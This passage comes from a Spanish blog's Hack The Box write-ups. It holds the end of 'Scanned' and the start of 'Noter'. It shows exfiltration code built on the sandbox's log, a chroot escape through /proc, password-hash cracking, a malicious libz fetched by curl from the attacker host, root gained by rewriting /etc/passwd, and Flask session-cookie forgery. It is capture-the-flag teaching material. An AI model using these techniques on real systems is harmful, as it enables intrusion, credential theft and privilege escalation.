salida, veremos que la instrucción syscall se reporta:\nSe ve que no todos los registros se muestran. Eso es porque sys_execve solamente necesita tres argumentos. Si quisiéramos más, podríamos haber usado sys_clone, que usa cinco registros, pero yo seguiré usando sys_execve, ya que solamente usaré ret como salida.\nAhora tenemos que parsear la información que queremos exfiltrar como valores hexadecimales y poner en ret el valor correspondiente. Esto es un ejemplo para exfiltrar el listado de directorios:\n#include \u0026lt;dirent.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; typedef struct __attribute__((__packed__)) { unsigned long rax; unsigned long rdi; unsigned long rsi; unsigned long rdx; unsigned long r10; unsigned long r8; unsigned long r9; unsigned long ret; } registers; void log_syscall(unsigned long ret) { registers result; result.rax = 0x3b; result.rdi = 0; result.rsi = 0; result.rdx = 0; result.r10 = 0; result.r8 = 0; result.r9 = 0; result.ret = ret; int fd = open(\"/log\", O_CREAT|O_RDWR|O_APPEND, 0777); if (fd == -1) { return; } write(fd, \u0026amp;result, sizeof(registers)); close(fd); } void read_file(char* path) { unsigned long ret = 0l; char ret_string[8] = {0, 0, 0, 0, 0, 0, 0, 0}; int fd = open(path, O_RDONLY); while (read(fd, ret_string, 8)) { ret = 0l; for (int i = 0; i \u0026lt; 8; i++) { ret \u0026lt;\u0026lt;= 8; ret += ret_string[i]; ret_string[i] = 0; } log_syscall(ret); } close(fd); } int main() { DIR* dr; struct dirent *de; FILE* fp; fp = fopen(\"tmp_file\", \"wb\"); dr = opendir(\".\"); while ((de = readdir(dr)) != NULL) { fprintf(fp, \"%s\\n\", de-\u0026gt;d_name); } closedir(dr); fclose(fp); read_file(\"tmp_file\"); return 0; }  Con curl y algo de filtrado, podemos extraer la información:\n$ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x7573720a2e0a746d\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x705f66696c650a6c\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x69620a7573657270\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x726f670a62696e0a\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x70726f630a2e2e0a\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x6c696236340a6c6f\u0026lt;/pre\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;execve(0x0, 0x0, 0x0) = 0x670a000000000000\u0026lt;/pre\u0026gt; $ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve | awk -F = '{ print $3 }' 0x7573720a2e0a746d\u0026lt;/pre\u0026gt; 0x705f66696c650a6c\u0026lt;/pre\u0026gt; 0x69620a7573657270\u0026lt;/pre\u0026gt; 0x726f670a62696e0a\u0026lt;/pre\u0026gt; 0x70726f630a2e2e0a\u0026lt;/pre\u0026gt; 0x6c696236340a6c6f\u0026lt;/pre\u0026gt; 0x670a000000000000\u0026lt;/pre\u0026gt; $ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve | awk -F = '{ print $3 }' | sed 's/\u0026lt;\\/pre\u0026gt;//g' 0x7573720a2e0a746d 0x705f66696c650a6c 0x69620a7573657270 0x726f670a62696e0a 0x70726f630a2e2e0a 0x6c696236340a6c6f 0x670a000000000000 $ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve | awk -F = '{ print $3 }' | sed 's/\u0026lt;\\/pre\u0026gt;//g' | awk -F x '{ printf \"%16s\\n\", $2 }' 7573720a2e0a746d 705f66696c650a6c 69620a7573657270 726f670a62696e0a 70726f630a2e2e0a 6c696236340a6c6f 670a000000000000 $ curl 127.0.0.1:8000/viewer/bfd6801836d0fa311b9a58c8fd25da94/ -s | grep execve | awk -F = '{ print $3 }' | sed 's/\u0026lt;\\/pre\u0026gt;//g' | awk -F x '{ printf \"%16s\\n\", $2 }' | xxd -r -p usr . tmp_file lib userprog bin proc .. lib64 log  Podemos seguir el mismo proceso para leer archivos del entorno de sandbox. Al final, decidí utilizar un script en Bash que compile el binario con el archivo a leer o el directorio a listar, lo sube y extrae la información de manera automática. El script se llama exploit.sh (explicación detallada aquí):\n$ bash exploit.sh [!] Usage: bash exploit.sh \u0026lt;host\u0026gt; \u0026lt;f|d\u0026gt; \u0026lt;path-to-file|dir\u0026gt; $ bash exploit.sh 127.0.0.1:8000 d / usr . tmp_file lib userprog bin proc .. lib64 log  En este punto podemos comenzar a enumerar el directorio /proc de la máquina remota. Como se explicó antes, hay una mala configuración porque el binario sandbox monta el directorio /proc en el entorno de chroot, lo que lo hace accesible desde la sandbox:\n$ bash exploit.sh 10.10.11.141 d /proc . .. fb fs bus dma irq mpt net sys tty acpi keys kmsg misc mtrr stat iomem kcore locks swaps crypto driver mounts uptime vmstat cgroups cmdline cpuinfo devices ioports loadavg meminfo modules sysvipc version consoles kallsyms pressure slabinfo softirqs zoneinfo buddyinfo diskstats key-users schedstat interrupts kpagecount kpageflags partitions timer_list execdomains filesystems kpagecgroup sched_debug vmallocinfo pagetypeinfo dynamic_debug sysrq-trigger self thread-self 1 2 3  Hay tres identificadores de proceso (PID) diferentes: 1, 2 y 3. Podemos listar los descriptores de archivo usados por dichos PID:\n$ bash exploit.sh 10.10.11.141 d /proc/1/fd . .. 0 1 2 3 $ bash exploit.sh 10.10.11.141 d /proc/2/fd . .. 0 1 2 3 4 $ bash exploit.sh 10.10.11.141 d /proc/3/fd . .. 0 1 2 3  Aquí hay que darse cuenta de que si listamos el descriptor de archivo número 3 (como directorio), estaremos listando el directorio jails:\n$ bash exploit.sh 10.10.11.141 d /proc/1/fd/3 7d431ab8af5ab635e048e40f36f69536 . 720e0160ff47fcd4da968b89de05d5e9 .. $ bash exploit.sh 10.10.11.141 d /proc/3/fd/3 . 720e0160ff47fcd4da968b89de05d5e9 ..  Por alguna razón, se obtiene más información con /proc/1/fd/3, por lo que continuaré usando este. De hecho, podemos escalar directorios hacia arriba, escapando del entorno de chroot:\n$ bash exploit.sh 10.10.11.141 d /proc/1/fd/3/.. jails . .. sandbox $ bash exploit.sh 10.10.11.141 f /proc/1/fd/3/../../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin clarence:x:1000:1000:clarence,,,:/home/clarence:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin sandbox:x:1001:1001::/home/sandbox:/usr/sbin/nologin  Intrusión en la máquina Genial, ahora tenemos un usuario de sistema llamado clarence y podemos leer archivos del servidor. Vamos a enumerar un poco más el servidor:\n$ bash exploit.sh 10.10.11.141 d /proc/1/fd/3/../.. scanner . malscanner .. viewer templates .gitignore sandbox static manage.py uploads uwsgi_params requirements.txt malscanner.db  Existe un archivo de base de datos SQLite llamado malscanner.db. Vamos a tratar de descargarlo y abrirlo:\n$ bash exploit.sh 10.10.11.141 f /proc/1/fd/3/../../malscanner.db \u0026gt; malscanner.db $ file malscanner.db malscanner.db: SQLite 3.x database, last written using SQLite version 3033745, file counter 34, database pages 32, cookie 0x42, schema 4, UTF-8, version-valid-for 34 $ sqlite3 malscanner.db SQLite version 3.37.0 2021-12-09 01:34:53 Enter \".help\" for usage hints. sqlite .tables Error: database disk image is malformed sqlite .exit  Está corrupto\u0026hellip; Pero todavía podemos mirar las strings del archivo, y encontrar un hash MD5 para clarence:\n$ strings malscanner.db | grep clarence md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf2021-09-14 18:39:55.237074clarence2021-09-14 18:36:46.227819 clarence  Como se trata de un hash con formato Django y contiene sal, decidí usar un script en Go personalizado para romperlo con rockyou.txt: crack.go (explicación detallada aquí):\n$ go run crack.go $WORDLISTS/rockyou.txt 'md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf' [*] Algorithm: md5 [*] Salt: kL2cLcK2yhbp3za4w3752m [*] Hash: 9886e17b091eb5ccdc39e436128141cf [+] Cracked: onedayyoufeellikecrying  Y ya tenemos una contraseña. Afortunadamente, esta contraseña se reutiliza para SSH. Y aquí tenemos la flag user.txt:\n$ ssh clarence@10.10.11.141 clarence@10.10.11.141's password: clarence@scanned:~$ cat user.txt 8e6287143ba5f57564bd0fb2ac7f733e  Library Hijacking Ahora tenemos la habilidad de ejecutar sandbox desde la propia máquina y realizar más acciones con malware preparado.\nPor ejemplo, podemos ejecutar binarios SUID y copiar librerías compartidas dentro de la jaula, de manera que el malware las utilice y podamos ejecutar comandos como root:\nclarence@scanned:~$ find / -perm -4000 2/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/chsh /usr/bin/su /usr/bin/fusermount /usr/bin/passwd /usr/bin/sudo /usr/bin/mount /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/chfn /usr/bin/umount  Vamos a comprobar qué librerías compartidas necesitan para ejecutarse correctamente: fusermount necesita las librerías que ya están en la jaula, que son las mismas que utiliza /bin/sh:\nclarence@scanned:~$ ldd /usr/bin/fusermount linux-vdso.so.1 (0x00007ffe36170000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1fb50e4000) /lib64/ld-linux-x86-64.so.2 (0x00007f1fb52ba000) clarence@scanned:~$ ldd /bin/sh linux-vdso.so.1 (0x00007ffe3d5a6000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc39def7000) /lib64/ld-linux-x86-64.so.2 (0x00007fc39e0e5000)  Para construir una librerlia maliciosa Glibc, podemos utilizar fakelib.sh. Primero, tenemos que descargar libc.so.6 a nuestra máquina de atacante.\nSin embargo, usando fakelib.sh sobre libc.so.6 puede no funcionar correctamente. Después de algunas pruebas, encontré que /usr/lib/openssh/ssh-keysign es SUID y utiliza libz.so.1:\nclarence@scanned:~$ ldd /usr/lib/openssh/ssh-keysign /usr/lib/openssh/ssh-keysign: linux-vdso.so.1 (0x00007ffdbe9e8000) libcrypto.so.1.1 = /lib/x86_64-linux-gnu/libcrypto.so.1.1 (0x00007f72529b4000) libz.so.1 = /lib/x86_64-linux-gnu/libz.so.1 (0x00007f7252997000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007f72527d2000) libdl.so.2 = /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f72527cc000) libpthread.so.0 = /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f72527aa000) /lib64/ld-linux-x86-64.so.2 (0x00007f7252d27000)  Por tanto, tenemos que descargar libz.so.1:\nclarence@scanned:~$ cd / clarence@scanned:/$ python3 -m http.server 1234 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...  $ wget -q 10.10.11.141:1234/lib/x86_64-linux-gnu/libz.so.1  Esta librería libz.so.1 no causará errores con fakelib.sh (a lo mejor porque es más pequeña que libc.so.6). Ahora podemos construir una librería maliciosa para ver si el ataque funciona:\n$ bash fakelib.sh -l libz.so.1 -o fakelibz.so.1 -g Generating fake library under fakelibz.so.1 $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  clarence@scanned:/$ cd /tmp clarence@scanned:/tmp$ curl 10.10.17.44/fakelibz.so.1 -so .libz.so.1  Necesitamos utilizar un script en Bash (.copy.sh) para ejecutarlo justo después de sandbox y copiar así todos los archivos necesarios en la jaula:\n#!/usr/bin/env bash dir=/var/www/malscanner/sandbox/jails for jail in $(ls $dir); do cp /lib/x86_64-linux-gnu/libcrypto.so.1.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libdl.so.2 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libpthread.so.0 $dir/$jail/lib/x86_64-linux-gnu/ cp /tmp/.libz.so.1 $dir/$jail/lib/x86_64-linux-gnu/libz.so.1 done  Y el malware que será compilado es este script en C tan sencillo (.exploit.c):\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { sleep(2); system(\"/proc/1/fd/3/../../../../../usr/lib/openssh/ssh-keysign\"); return 0; }  Nótese que estamos ejecutanso ssh-keysign escapando de chroot, de manera que se ejecuta como binario SUID.\nDespués de guardarlo en la máquina, tenemos que ejecutar sandbox y justo después ejecutar el script en Bash (nótese que añadí una instrucción sleep(2) para tener algo de tiempo adicional). Es como si fuera una condición de carrera.\n$ ssh clarence@10.10.11.141 clarence@10.10.11.141's password: clarence@scanned:~$ cd /var/www/malscanner/sandbox clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit  clarence@scanned:/tmp$ bash .copy.sh  Y veremos la siguiente salida:\nclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit Library hijacked! Exited Kill err: (3)  Entonces, el ataque ha funcionado. Ahora podemos ejecutar un comando personalizado con fakelib.sh. El propio script provee una forma de usar bash poniendo UID/GID como EUID/EGID:\n$ bash fakelib.sh -l libz.so.1 -o fakelibz.so.1 -g -p bash Generating fake library under fakelibz.so.1 $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  clarence@scanned:/tmp$ curl 10.10.17.44/fakelibz.so.1 -so .libz.so.1  Además, necesitamos copiar /bin/bash y más librerías compartidas en la jaula:\nclarence@scanned:/tmp$ ldd /bin/bash linux-vdso.so.1 (0x00007fff80bec000) libtinfo.so.6 = /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fd3ac155000) libdl.so.2 = /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fd3ac14f000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd3abf8a000) /lib64/ld-linux-x86-64.so.2 (0x00007fd3ac2c4000)  Y entonces, este es el script .copy.sh actualizado:\n#!/usr/bin/env bash dir=/var/www/malscanner/sandbox/jails for jail in $(ls $dir); do cp /lib/x86_64-linux-gnu/libcrypto.so.1.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libdl.so.2 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libpthread.so.0 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libtinfo.so.6 $dir/$jail/lib/x86_64-linux-gnu/ cp /bin/bash $dir/$jail/bin cp /tmp/.libz.so.1 $dir/$jail/lib/x86_64-linux-gnu/libz.so.1 done  Ahora realizamos el ataque otra vez:\nclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit  clarence@scanned:/tmp$ bash .copy.sh  clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit bash-5.1# Killed subprocess Exited  Nótese el #, por lo que tenemos bash ejecutado como root, pero el proceso muere a los 5 segundos\u0026hellip;\nEscalada de privilegios Para obtener una shell como root en condiciones, decidí modificar /etc/passwd y ponerle una contraseña a root usando openssl (formato DES Unix):\n$ openssl passwd 7rocky gf2QeNVUpedfI  Para modificar /etc/passwd usaré sed, por lo que tendré que copiar /usr/bin/sed y más librerías compartidas en la jaula:\nclarence@scanned:/tmp$ ldd /usr/bin/sed linux-vdso.so.1 (0x00007fffcbeea000) libacl.so.1 = /lib/x86_64-linux-gnu/libacl.so.1 (0x00007fe73de49000) libselinux.so.1 = /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fe73de1d000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe73dc58000) libpcre2-8.so.0 = /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fe73dbc0000) libdl.so.2 = /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe73dbba000) /lib64/ld-linux-x86-64.so.2 (0x00007fe73de7a000) libpthread.so.0 = /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe73db98000)  Este es el archivo .copy.sh actualizado:\n#!/usr/bin/env bash dir=/var/www/malscanner/sandbox/jails for jail in $(ls $dir); do cp /lib/x86_64-linux-gnu/libacl.so.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libcrypto.so.1.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libdl.so.2 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libpcre2-8.so.0 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libpthread.so.0 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libselinux.so.1 $dir/$jail/lib/x86_64-linux-gnu/ cp /lib/x86_64-linux-gnu/libtinfo.so.6 $dir/$jail/lib/x86_64-linux-gnu/ cp /bin/bash $dir/$jail/bin cp /usr/bin/sed $dir/$jail/bin cp /tmp/.libz.so.1 $dir/$jail/lib/x86_64-linux-gnu/libz.so.1 done  Tendremos que copiar este comando en el portapapeles para poder pegarlo tan pronto como obtengamos la shell como root (nótese que usamos /proc/1/fd/3/../../../../../etc/passwd para escapar de chroot de nuevo):\n/bin/sed -i s/root:x/root:gf2QeNVUpedfI/g /proc/1/fd/3/../../../../../etc/passwd  Ahora realizamos el ataque de library hijacking:\nclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit  clarence@scanned:/tmp$ bash .copy.sh  Rápidamente, copiamos el comando:\nclarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /tmp/.exploit Exited bash-5.1# /bin/sed -i s/root:x/root:gf2QeNVUpedfI/g /proc/1/fd/3/../../../../../etc/passwd bash-5.1# Kill err: (3)  Y\u0026hellip;\nclarence@scanned:/tmp$ head -1 /etc/passwd root:gf2QeNVUpedfI:0:0:root:/root:/bin/bash  Hemos modificado /etc/passwd, por lo que tenemos acceso como root (con la contraseña 7rocky):\nclarence@scanned:/tmp$ su root Password: root@scanned:/tmp# cat /root/root.txt 8f587d54e14d5747055bb717dd2cc520  ","image":"/images/HTB/Scanned/Scanned.png","permalink":"https://7rocky.github.io/htb/scanned/","section":"htb","summary":"Hack The Box. Linux. Máquina insana. Esta máquina tiene una página web que es capaz de analizar malware. Al analizar el código en C del sandbox, se ve que se puede utilizar un archivo de log para exfiltrar información por medio del servidor web, y también abusar de una mala configuración para escapar de chroot. Luego, podemos leer una base de datos SQLite y extraer el hash de una contraseña, que se reutiliza para SSH. Una vez en la máquina, se puede ejecutar un binario SUID desde la sandbox y copiar una librería compartida maliciosa para que el binario SUID ejecute Bash como root. Para comprometer esta máquina se necesitan conocimientos avanzados de Linux, programación en C y Bash, experiencia en auditoría de código y técnicas de evasión. En este write-up se utiliza un script en Bash con un programa en C embebido para listar directorios y leer archivos del servidor y también un programa en Go para romper el hash de una contraseña","time":16,"title":"Scanned"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.160   Fecha: 07 / 05 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.160 -p 21,22,5000 Nmap scan report for 10.10.11.160 Host is up (0.052s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA) | 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA) |_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519) 5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10) |_http-title: Noter Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.47 seconds  La máquina tiene abiertos los puertos 21 (FTP), 22 (SSH) y 5000 (HTTP).\nEnumeración web Si vamos a http://10.10.11.160:5000, tenemos la siguiente página web:\nLo primero que podemos hacer es registrar una nueva cuenta como rocky:\nY luego iniciar sesión:\nAhora tenemos acceso a nuestro dashboard personal:\nParece que existe una suscripción VIP, pero no está activa:\nY también podemos añadir una nueva nota:\nAquí podemos probar vulnerabilidades comunes como Server-Side Template Injection (SSTI) o Cross-Site Scripting (XSS). De hecho, la herramienta que gestiona las notas es CKEditor:\nEsta versión de CKEditor (4.6.2) tiene una vulnerabilidad de XSS (más información en snyk.io). No obstante, no hay nadie leyendo nuestras notas, por lo que XSS no será útil para la explotación.\nEn este punto, podemos tratar de obtener la tecnología usada en el back-end. La cabecera Server muestra Werkzeug/2.0.2 Python/3.8.10, lo cual significa que la tecnología del back-end es probablemente Flask. Además, tenemos una cookie de sesión típica de Flask, y el mensaje de respuesta HTTP está en letras mayúsculas (302 FOUND):\n$ curl 10.10.11.160:5000/dashboard -I HTTP/1.0 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 218 Location: http://10.10.11.160:5000/login Vary: Cookie Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVW5hdXRob3JpemVkLCBQbGVhc2UgbG9naW4iXX1dfQ.YtMgNg.FAhOFDdpcAg905AbEook1WRrB4U; HttpOnly; Path=/ Server: Werkzeug/2.0.2 Python/3.8.10 Date: Sat, 16 Jul 2022 20:31:50 GMT  Podemos coger nuestra propia cookie de sesión y decodificarla con flask-unsign:\n$ flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMW3Q.11eEHt1GC3R0gKwJCFYa5euDte8 {'logged_in': True, 'username': 'rocky'}  Esta herramienta es capaz de realizar un ataque de fuerza bruta para extraer la clave secreta usada para firmar las cookies.\n$ flask-unsign --unsign --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMW3Q.11eEHt1GC3R0gKwJCFYa5euDte8 [*] Session decodes to: {'logged_in': True, 'username': 'rocky'} [*] No wordlist selected, falling back to default wordlist.. [*] Starting brute-forcer with 8 threads.. [*] Attempted (2048): -----BEGIN PRIVATE KEY-----*** [+] Found secret key after 17408 attemptsQtX/puoAECjC 'secret123'  Ahí está (secret123). En este punto, podemos falsificar cookies de sesión. Sin embargo, no tenemos ningún usuario válido. Podemos probar con nombres de usuario comunes como admin o administrator, pero no son válidos:\n$ flask-unsign --sign --cookie \"{'logged_in': True, 'username': 'admin'}\" --secret secret123 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YtMdfA.W2r5MJWyB2eQCgY4oCYC8GEv0g0 $ flask-unsign --sign --cookie \"{'logged_in': True, 'username': 'administrator'}\" --secret secret123 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW5pc3RyYXRvciJ9.YtMdkw.XbITVqjTiqkQdmH50xODDdubJg0  Una manera de enumerar usuarios es falsificar cookies de sesión usando un diccionario y luego usar ffuf para comprobar cada cookie:\n$ for name in $(cat $WORDLISTS/names.txt); do flask-unsign --sign --cookie \"{'logged_in': True, 'username': '$name'}\" --secret secret123; done \u0026gt; sessions.txt $ ffuf -w sessions.txt -u http://10.10.11.160:5000/dashboard -H 'Cookie: session=FUZZ' -mc 200 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtMfew._xogDzgiDE-mwbolv2fbRKt28NI [Status: 200, Size: 2444, Words: 565, Lines: 83, Duration: 90ms] eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMi1A.42ax8lWMfqrz4CVh9oKkhuqB6eU [Status: 200, Size: 3230, Words: 807, Lines: 109, Duration: 143ms]  Genial, veamos qué usuarios son estos:\n$ flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtMfew._xogDzgiDE-mwbolv2fbRKt28NI {'logged_in': True, 'username': 'blue'} $ flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicm9ja3kifQ.YtMi1A.42ax8lWMfqrz4CVh9oKkhuqB6eU {'logged_in': True, 'username': 'rocky'}  Vale, rocky es mi usuario (aparece en el diccionario). Si usamos la cookie de sesión de blue veremos un dashboard distinto (uno VIP):\nEstas son las notas de blue:\nLa primera es bastante interesante porque muestra una contraseña (blue@Noter!) y otro nombre de usuario (ftp_admin):\nLa segunda nota no es tan interesante:\nPodemos tratar de falsificar una cookie para ftp_admin, pero no funciona.\nComo miembro VIP, podemos importar notas en Markdown (probando diferentes extensiones como .txt, .html hasta encontrar que .md es válida):\nY también podemos exportar notas de Markdown a PDF:\nEnumeración de FTP En este punto, podemos enumerar el servidor FTP. Podemos acceder usando las credenciales blue:blue@Noter!:\n$ ftp blue@10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files -rw-r--r-- 1 1002 1002 12569 Dec 24 2021 policy.pdf 226 Directory send OK. ftp\u0026gt; get policy.pdf 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for policy.pdf (12569 bytes). WARNING! 286 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 12569 bytes received in 0,0374 seconds (329 kbytes/s) ftp\u0026gt; cd files 250 Directory successfully changed. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK.  Lo único que podemos sacar es un archivo PDF llamado policy.pdf. Aunque el modo ASCII está habilitado (no el modo binario), el archivo PDF está correcto. En este archivo podemos encontrar una frase interesante:\n Default user-password generated by the application is in the format of \u0026ldquo;username@site_name!\u0026rdquo; (This applies to all your applications)\n La contraseña para blue coincide con esta regla. Vamos a comprobar si la de ftp_admin también. En la página web no funciona, pero sí podemos acceder por FTP con las credenciales por defecto:\n$ ftp ftp_admin@10.10.11.160 Connected to 10.10.11.160. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip -rw-r--r-- 1 1003 1003 26298 Dec 01 2021 app_backup_1638395546.zip 226 Directory send OK. ftp\u0026gt; get app_backup_1638395546.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes). WARNING! 100 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 26298 bytes received in 0,102 seconds (252 kbytes/s)  Aquí tenemos un problema porque los archivos ZIP encontrados están corruptos (como resultado del modo ASCII de FTP):\n$ unzip -l app_backup_1638395546.zip Archive: app_backup_1638395546.zip error [app_backup_1638395546.zip]: missing 3 bytes in zipfile (attempting to process anyway) error [app_backup_1638395546.zip]: start of central directory not found; zipfile corrupt. (please check that you have transferred or created the zipfile in the appropriate BINARY mode and that you have compiled UnZip properly)  Una manera de conseguirlos bien es con curl:\n$ curl ftp://'ftp_admin:ftp_admin%40Noter!'@10.10.11.160/ -rw-r--r-- 1 1003 1003 25559 Nov 01 2021 